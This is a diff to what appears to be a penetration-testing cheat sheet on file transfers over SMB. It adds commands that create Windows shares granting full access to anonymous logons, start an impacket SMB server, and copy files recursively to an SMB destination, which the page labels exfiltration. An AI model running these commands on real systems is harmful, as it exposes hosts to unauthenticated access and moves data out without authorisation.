@@ -16,6 +16,21 @@ parent: File Transfers
 ---
 
 ## SMB
+Setup/delete unauthed SMB share on Windows
+```powershell
+net share <share name>=<path> /GRANT:"ANONYMOUS LOGON,FULL" /GRANT:"Everyone,FULL"
+net share <folder> /DELETE
+```
+```powershell
+New-SmbShare -Name <share name> -Path <path> -FullAccess 'ANONYMOUS LOGON','Everyone' -Temporary
+Remove-SmbShare <share name>
+```
+
+impacket SMB server
+```powershell
+python smbserver.py [-smb2support] [-username <username>] [-password <password>] <share name> <path> 
+```
+
 Exfill files recursively
 ```powershell
 xcopy /c /h /r /s /y <source> <smb destination>
